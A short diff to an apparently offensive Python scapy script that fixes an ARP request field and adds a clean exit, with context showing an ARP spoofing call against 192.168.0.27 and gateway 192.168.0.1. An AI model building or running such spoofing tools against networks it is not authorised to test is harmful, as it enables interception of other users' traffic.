@@ -4,7 +4,7 @@
 import scapy.all as scapy
 
 def get_target_mac(ip):
-    arp_req = scapy.ARP(dst=ip)
+    arp_req = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     finalPacket = broadcast/arp_req
     answer = scapy.srp(finalPacket, timeout=2, verbose=False)[0]
@@ -23,6 +23,7 @@ def main():
             spoof_args("192.168.0.27", "192.168.0.1")
     except KeyboardInterrupt:
         print("bye")
+        exit(0)
 
 
 
